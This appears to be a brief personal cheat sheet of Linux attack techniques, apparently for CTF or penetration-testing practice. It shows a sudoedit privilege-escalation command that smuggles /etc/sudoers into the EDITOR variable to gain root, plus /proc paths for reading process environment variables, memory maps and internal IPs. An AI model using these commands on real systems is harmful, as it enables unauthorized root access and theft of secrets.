# exp

## sudoedit

```sh
sudo -l
NOPASSWD: sudoedit /etc/GAMELAB
# exp
$ EDITOR='nano -- /etc/sudoers' sudoedit /etc/GAMELAB
```

# proc

```sh
cat /proc/self/environ    # 环境变量
/proc/self/exe # exe程序
/proc/self/cwd # 执行目录  readlink cwd 看实际路径， ls -la 也行
cat /proc/13598/maps | grep libnet # 内存
/proc/net/fib_trie        # 内网IP
```
